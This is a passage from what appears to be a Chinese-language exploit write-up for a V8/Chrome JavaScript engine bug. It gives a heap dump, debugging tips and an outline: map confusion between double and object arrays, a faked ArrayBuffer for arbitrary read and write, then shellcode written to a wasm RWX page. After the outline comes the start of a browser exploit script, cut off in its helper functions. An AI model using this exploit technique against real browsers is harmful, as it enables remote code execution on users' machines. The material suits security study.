0x33a1055ce130: 0x000033a12d09f409&#125;</span><br><span class="line">&#x2F;&#x2F;                                    &#123;0x000033a14e0c2f79-&gt;b obj</span><br><span class="line">&#x2F;&#x2F; 0x33a1055ce140: 0x000033a10f480c71 0x000033a1055ce101</span><br><span class="line">&#x2F;&#x2F; 0x33a1055ce150: 0x0000000500000000&#125;</span><br><span class="line">&#x2F;&#x2F;                                    &#123;0x000033a10f4814f9-&gt;c elements</span><br><span class="line">&#x2F;&#x2F; 0x33a1055ce160: 0x0000000500000000 0x400a666666666666</span><br><span class="line">&#x2F;&#x2F; 0x33a1055ce170: 0x400a666666666666 0x400a666666666666</span><br><span class="line">&#x2F;&#x2F; 0x33a1055ce180: 0x400a666666666666 0x400a666666666666&#125;</span><br><span class="line">&#x2F;&#x2F; 0x33a1055ce190: &#123;0x000033a14e0c2ed9 0x000033a10f480c71-&gt;c obj</span><br><span class="line">&#x2F;&#x2F; 0x33a1055ce1a0: 0x000033a1055ce159 0x0000000500000000&#125;</span><br><span class="line">&#x2F;&#x2F; 0x33a1055ce1b0: 0xdeadbeedbeadbeef 0xdeadbeedbeadbeef</span><br><span class="line">&#x2F;&#x2F; 0x33a1055ce1c0: 0xdeadbeedbeadbeef 0xdeadbeedbeadbeef</span><br><span class="line">&#x2F;&#x2F; 0x33a1055ce1d0: 0xdeadbeedbeadbeef 0xdeadbeedbeadbeef</span><br></pre></td></tr></table></figure><h3 id="gc"><a href="#gc" class="headerlink" title="gc"></a>gc</h3><p>在要fake的arraybuffer的前后两次gc，使其内存分布更稳定。</p><h3 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h3><p>调试的话，直接在对应版本的v8 release上调试，然后写到html里，放到chrome里就行了，偏移什么的都没有改变。<br>也可以直接gdb attach到chrome里调试。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>利用思路非常简单<br>首先分配两个array，一个double array，一个object array<br>然后通过覆盖object array的map为double map，就可以将其中的用户空间对象leak出来。<br>然后在array的elments去fake一个arraybuffer。<br>然后通过将double array的map覆盖成object array，就可以将fake好的arraybuffer给当成object给取出来。<br>而这个fake的arraybuffer的内容是我们可控的，于是就可以任意地址读写了。<br>接下来就是找到wasm_func里rwx的地址，将shellcode写入执行即可。<br>我的exp写的比较dirty。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">String.prototype.padLeft &#x3D;</span><br><span class="line">Number.prototype.padLeft &#x3D; function(total, pad) &#123;</span><br><span class="line">  return (Array(total).join(pad || 0) + this).slice(-total);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Return the hexadecimal representation of the given byte array.</span><br><span class="line">function hexlify(bytes) &#123;</span><br><span class="line">    var res &#x3D; [];</span><br><span class="line">    for (var i &#x3D; 0; i &lt; bytes.length; i++)&#123;</span><br><span class="line">        &#x2F;&#x2F;print(bytes[i].toString(16));</span><br><span class="line">        res.push((&#39;0&#39; + bytes[i].toString(16)).substr(-2));</span><br><span class="line">    &#125;</span><br><span class="line">    return res.join(&#39;&#39;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Return the binary data represented by the given hexdecimal string.</span><br><span class="line">function unhexlify(hexstr) &#123;</span><br><span class="line">    if (hexstr.length % 2 &#x3D;&#x3D; 1)</span><br><span class="line">        throw new TypeError(&quot;Invalid hex string&quot;);</span><br><span class="line"></span><br><span class="line">    var bytes &#x3D; new Uint8Array(hexstr.length &#x2F; 2);</span><br><span class="line">    for (var i &#x3D; 0; i &lt; hexstr.length; i +&#x3D; 2)</span><br><span class="line">        bytes[i&#x2F;2] &#x3D; parseInt(hexstr.substr(i, 2), 16);</span><br><span class="line"></span><br><span class="line">    return bytes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function hexdump(data) &#123;</span><br><span class="line">    if (typeof data.BYTES_PER_ELEMENT !&#x3D;&#x3D; &#39;undefined&#39;)</span><br><span class="line">        data &#x3D; Array.from(data);</span><br><span class="line"></span><br><span class="line">    var lines &#x3D; [];</span><br><span class="line">        var chunk &#x3D; data.slice(i, i+16);</span><br><span class="line">    for (var i &#x3D; 0; i &lt; data.length; i +&#x3D; 16) &#123;</span><br><span class="line">        var parts &#x3D; chunk.map(hex);</span><br><span class="line">        if (parts.length &gt; 8)</span><br><span class="line">            parts.splice(8, 0, &#39; &#39;);</span><br><span class="line">        lines.push(parts.join(&#39; &#39;));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return lines.join(&#39;\n&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Simplified version of the similarly named python module.</span><br><span class="line">var Struct &#x3D; (function() &#123;</span><br><span class="line">    &#x2F;&#x2F; Allocate these once to avoid unecessary heap allocations during pack&#x2F;unpack operations.</span><br><span class="line">    var buffer      &#x3D; new ArrayBuffer(8);</span><br><span class="line">    var byteView    &#x3D; new Uint8Array(buffer);</span><br><span class="line">    var uint32View  &#x3D; new Uint32Array(buffer);</span><br><span class="line">    var float64View &#x3D; new Float64Array(buffer);</span><br><span class="line"></span><br><span class="line">    return &#123;</span><br><span class="line">        pack: function(type, value) &#123;</span><br><span class="line">            var view &#x3D; type;        &#x2F;&#x2F; See below</span><br><span class="line">            view[0] &#x3D; value;</span><br><span class="line">            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        unpack: function(type, bytes) &#123;</span><br><span class="line">            if (bytes.length !&#x3D;&#x3D; type.BYTES_PER_ELEMENT)</span><br><span class="line">                throw Error(&quot;Invalid bytearray&quot;);</span><br><span class="line"></span><br><span class="line">            var view &#x3D; type;        &#x2F;&#x2F; See below</span><br><span class="line">            byteView.set(bytes);</span><br><span class="line">            return view[0];</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Available types.</span><br><span class="line">        int8:    byteView,</span><br><span class="line">        int32:   uint32View,</span><br><span class="line">        float64: float64View</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">function Int64(v) &#123;</span><br><span class="line">    &#x2F;&#x2F; The underlying byte array.</span><br><span class="line">    var bytes &#x3D; new Uint8Array(8);</span><br><span class="line"></span><br><span class="line">    switch (typeof v) &#123;</span><br><span class="line">        case &#39;number&#39;:</span><br><span class="line">            v &#x3D; &#39;0x&#39; + Math.floor(v).toString(16);</span><br><span class="line">        case &#39;string&#39;:</span><br><span class="line">            if (v.startsWith(&#39;0x&#39;))</span><br><span class="line">                v &#x3D; v.substr(2);</span><br><span class="line">            if (v.length % 2 &#x3D;&#x3D; 1)</span><br><span class="line">                v &#x3D; &#39;0&#39; + v;</span><br><span class="line"></span><br><span class="line">            var bigEndian &#x3D; unhexlify(v, 8);</span><br><span class="line">            &#x2F;&#x2F;print(bigEndian.toString());</span><br><span class="line">            bytes.set(Array.from(bigEndian).reverse());</span><br><span class="line">            break;</span><br><span class="line">        case &#39;object&#39;:</span><br><span class="line">            if (v instanceof Int64) &#123;</span><br><span class="line">                bytes.set(v.bytes());</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                if (v.length !&#x3D; 8)</span><br><span class="line">                    throw TypeError(&quot;Array must have excactly 8 elements.&quot;);</span><br><span class="line">                bytes.set(v);</span><br><span class="line">            &#125;</span><br><span class="line">            break;</span><br><span class="line">        case &#39;undefined&#39;:</span><br><span class="line">            break;</span><br><span class="line">        default:</span><br><span class="line">            throw TypeError(&quot;Int64 constructor requires an argument.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Return a double whith the same underlying bit representation.</span><br><span class="line">    this.asDouble &#x3D; function() &#123;</span><br><span class="line">        &#x2F;&#x2F; Check for NaN</span><br><span class="line">        if (bytes[7] &#x3D;&#x3D; 0xff &amp;&amp; (bytes[6] &#x3D;&#x3D; 0xff || bytes[6] &#x3D;&#x3D; 0xfe))</span><br><span class="line">            throw new RangeError(&quot;Integer can not be represented by a double&quot;);</span><br><span class="line"></span><br><span class="line">        return Struct.unpack(Struct.float64, bytes);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Return a javascript value with the same underlying bit representation.</span><br><span class="line">    &#x2F;&#x2F; This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)</span><br><span class="line">    &#x2F;&#x2F; due to double conversion constraints.</span><br><span class="line">    this.asJSValue &#x3D; function() &#123;</span><br><span class="line">        if ((bytes[7] &#x3D;&#x3D; 0 &amp;&amp; bytes[6] &#x3D;&#x3D; 0) || (bytes[7] &#x3D;&#x3D; 0xff &amp;&amp; bytes[6] &#x3D;&#x3D; 0xff))</span><br><span class="line">            throw new RangeError(&quot;Integer can not be represented by a JSValue&quot;);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; For NaN-boxing, JSC adds 2^48 to a double value&#39;s bit pattern.</span><br><span class="line">        this.assignSub(this, 0x1000000000000);</span><br><span class="line">        var res &#x3D; Struct.unpack(Struct.float64, bytes);</span><br><span class="line">        this.assignAdd(this, 0x1000000000000);</span><br><span class="line"></span><br><span class="line">        return res;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Return the underlying bytes of this number as array.</span><br><span class="line">    this.bytes &#x3D; function() &#123;</span><br><span class="line">        return Array.from(bytes);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Return the byte at the given index.</span><br><span class="line">    this.byteAt &#x3D; function(i) &#123;</span><br><span class="line">        return bytes[i];</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Return the value of this number as unsigned hex string.</span><br><span class="line">    this.toString &#x3D; function() &#123;</span><br><span class="line">        &#x2F;&#x2F;print(&quot;toString&quot;);</span><br><span class="line">        return &#39;0x&#39; + hexlify(Array.from(bytes).reverse());</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Basic arithmetic.</span><br><span class="line">    &#x2F;&#x2F; These functions assign the result of the computation to their &#39;this&#39; object.</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Decorator for Int64 instance operations. Takes care</span><br><span class="line">    &#x2F;&#x2F; of converting arguments to Int64 instances if required.</span><br><span class="line">    function operation(f, nargs) &#123;</span><br><span class="line">        return function() &#123;</span><br><span class="line">            if (arguments.length !&#x3D; nargs)</span><br><span class="line">                throw Error(&quot;Not enough arguments for function &quot; + f.name);</span><br><span class="line">            for (var i &#x3D; 0; i &lt; arguments.length; i++)</span><br><span class="line">                if (!(arguments[i] instanceof Int64))</span><br><span class="line">                    arguments[i] &#x3D; new Int64(arguments[i]);</span><br><span class="line">            return f.apply(this, arguments);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; this &#x3D; -n (two&#39;s complement)</span><br><span class="line">    this.assignNeg &#x3D; operation(function neg(n) &#123;</span><br><span class="line">        for (var i &#x3D; 0; i &lt; 8; i++)</span><br><span class="line">            bytes[i] &#x3D; ~n.byteAt(i);</span><br><span class="line"></span><br><span class="line">        return this.assignAdd(this, Int64.One);</span><br><span class="line">    &#125;, 1);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; this &#x3D; a + b</span><br><span class="line">    this.assignAdd &#x3D; operation(function add(a, b) &#123;</span><br><span class="line">        var carry &#x3D; 0;</span><br><span class="line">        for (var i &#x3D; 0; i &lt; 8; i++) &#123;</span><br><span class="line">            var cur &#x3D; a.byteAt(i) + b.byteAt(i) + carry;</span><br><span class="line">            carry &#x3D; cur &gt; 0xff | 0;</span><br><span class="line">            bytes[i] &#x3D; cur;</span><br><span class="line">        &#125;</span><br><span class="line">        return this;</span><br><span class="line">    &#125;, 2);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; this &#x3D; a - b</span><br><span class="line">    this.assignSub &#x3D; operation(function sub(a, b) &#123;</span><br><span class="line">        var carry &#x3D; 0;</span><br><span class="line">        for (var i &#x3D; 0; i &lt; 8; i++) &#123;</span><br><span class="line">            var cur &#x3D; a.byteAt(i) - b.byteAt(i) - carry;</span><br><span class="line">            carry &#x3D; cur &lt; 0 | 0;</span><br><span class="line">            bytes[i] &#x3D; cur;</span><br><span class="line">        &#125;</span><br><span class="line">        return this;</span><br><span class="line">    &#125;, 2);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; this &#x3D; a &amp; b</span><br><span class="line">    this.assignAnd &#x3D; operation(function and(a, b) &#123;</span><br><span class="line">        for (var i &#x3D; 0; i &lt; 8; i++) &#123;</span><br><span class="line">            bytes[i] &#x3D; a.byteAt(i) &amp; b.byteAt(i);</span><br><span class="line">        &#125;</span><br><span class="line">        return this;</span><br><span class="line">    &#125;, 2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Constructs a new Int64 instance with the same bit representation as the provided double.</span><br><span class="line">Int64.fromDouble &#x3D; function(d) &#123;</span><br><span class="line">    var bytes &#x3D; Struct.pack(Struct.float64, d);</span><br><span class="line">    return new Int64(bytes);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Convenience functions. These allocate a new Int64 to hold the result.</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Return -n (two&#39;s complement)</span><br><span class="line">function Neg(n) &#123;</span><br><span class="line">    return (new Int64()).assignNeg(n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Return a + b</span><br><span class="line">function Add(a, b) &#123;</span><br><span class="line">    return (new Int64()).assignAdd(a, b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Return a - b</span><br><span class="line">function Sub(a, b) &#123;</span><br><span class="line">    return (new Int64()).assignSub(a, b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Return a &amp; b</span><br><span class="line">function And(a, b) &#123;</span><br><span class="line">    return (new Int64()).assignAnd(a, b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function hex(a) &#123;</span><br><span class="line">    if (a &#x3D;&#x3D; undefined) return &quot;0xUNDEFINED&quot;;</span><br><span class="line">    var ret &#x3D; a.toString(16);</span><br><span class="line">    if (ret.substr(0,2) !&#x3D; &quot;0x&quot;) return &quot;0x&quot;+ret;</span><br><span class="line">    else return ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function lower(x) &#123;</span><br><span class="line">    &#x2F;&#x2F; returns the lower 32bit of double x</span><br><span class="line">    return parseInt((&quot;0000000000000000&quot; + Int64.fromDouble(x).toString()).substr(-8,8),16) | 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function upper(x) &#123;</span><br><span class="line">    &#x2F;&#x2F; returns the upper 32bit of double x</span><br><span class="line">    return parseInt((&quot;0000000000000000&quot; + Int64.fromDouble(x).toString()).substr(-16, 8),16) | 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function lowerint(x) &#123;</span><br><span class="line">    &#x2F;&#x2F; returns the lower 32bit of int x</span><br><span class="line">    return parseInt((&quot;0000000000000000&quot; + x.toString(16)).substr(-8,8),16) | 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function upperint(x) &#123;</span><br><span class="line">    &#x2F;&#x2F; returns the upper 32bit of int x</span><br><span class="line">    return parseInt((&quot;0000000000000000&quot; + x.toString(16)).substr(-16, 8),16) | 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function combine(a, b) &#123;</span><br><span class="line">    &#x2F;&#x2F;a &#x3D; a &gt;&gt;&gt; 0;</span><br><span class="line">    &#x2F;&#x2F;b &#x3D; b &gt;&gt;&gt; 0;</span><br><span class="line">    &#x2F;&#x2F;print(a.toString());</span><br><span class="line">    &#x2F;&#x2F;print(b.toString());</span><br><span class="line">    return parseInt(Int64.fromDouble(b).toString() + Int64.fromDouble(a).toString(), 16);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;padLeft用于字符串左补位</span><br><span class="line"></span><br><span class="line">function combineint(a, b) &#123;</span><br><span class="line">    &#x2F;&#x2F;a &#x3D; a &gt;&gt;&gt; 0;</span><br><span class="line">    &#x2F;&#x2F;b &#x3D; b &gt;&gt;&gt; 0;</span><br><span class="line">    return parseInt(b.toString(16).substr(-8,8) + (a.toString(16)).padLeft(8), 16);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">  &#x2F;&#x2F; based on Long.js by dcodeIO</span><br><span class="line">  &#x2F;&#x2F; https:&#x2F;&#x2F;github.com&#x2F;dcodeIO&#x2F;Long.js</span><br><span class="line">  &#x2F;&#x2F; License Apache 2</span><br><span class="line">  class _u64 &#123;</span><br><span class="line">     constructor(hi, lo) &#123;</span><br><span class="line">        this.lo_ &#x3D; lo;</span><br><span class="line">        this.hi_ &#x3D; hi;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     hex() &#123;</span><br><span class="line">        var hlo &#x3D; (this.lo_ &lt; 0 ? (0xFFFFFFFF + this.lo_ + 1) : this.lo_).toString(16)</span><br><span class="line">        var hhi &#x3D; (this.hi_ &lt; 0 ? (0xFFFFFFFF + this.hi_ + 1) : this.hi_).toString(16)</span><br><span class="line">        if(hlo.substr(0,2) &#x3D;&#x3D; &quot;0x&quot;) hlo &#x3D; hlo.substr(2,hlo.length);</span><br><span class="line">        if(hhi.substr(0,2) &#x3D;&#x3D; &quot;0x&quot;) hhi &#x3D; hhi.substr(2,hji.length);</span><br><span class="line">        hlo &#x3D; &quot;00000000&quot; + hlo</span><br><span class="line">        hlo &#x3D; hlo.substr(hlo.length-8, hlo.length);</span><br><span class="line">        return &quot;0x&quot; + hhi + hlo;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     isZero() &#123;</span><br><span class="line">        return this.hi_ &#x3D;&#x3D; 0 &amp;&amp; this.lo_ &#x3D;&#x3D; 0;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     equals(val) &#123;</span><br><span class="line">        return this.hi_ &#x3D;&#x3D; val.hi_ &amp;&amp; this.lo_ &#x3D;&#x3D; val.lo_;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     and(val) &#123;</span><br><span class="line">        return new _u64(this.hi_ &amp; val.hi_, this.lo_ &amp; val.lo_);</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     add(val) &#123;</span><br><span class="line">        var a48 &#x3D; this.hi_ &gt;&gt;&gt; 16;</span><br><span class="line">        var a32 &#x3D; this.hi_ &amp; 0xFFFF;</span><br><span class="line">        var a16 &#x3D; this.lo_ &gt;&gt;&gt; 16;</span><br><span class="line">        var a00 &#x3D; this.lo_ &amp; 0xFFFF;</span><br><span class="line">  </span><br><span class="line">        var b48 &#x3D; val.hi_ &gt;&gt;&gt; 16;</span><br><span class="line">        var b32 &#x3D; val.hi_ &amp; 